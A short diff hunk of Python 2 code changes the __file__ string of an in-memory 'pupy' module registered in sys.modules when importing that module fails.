@@ -82,7 +82,7 @@ except ImportError, e:
     print 'Couldnt load pupy: {}'.format(e)
     mod = imp.new_module("pupy")
     mod.__name__ = "pupy"
-    mod.__file__ = "<memimport>\\\\pupy"
+    mod.__file__ = "pupy://pupy"
     mod.__package__ = "pupy"
     sys.modules["pupy"] = mod
     mod.pseudo = True
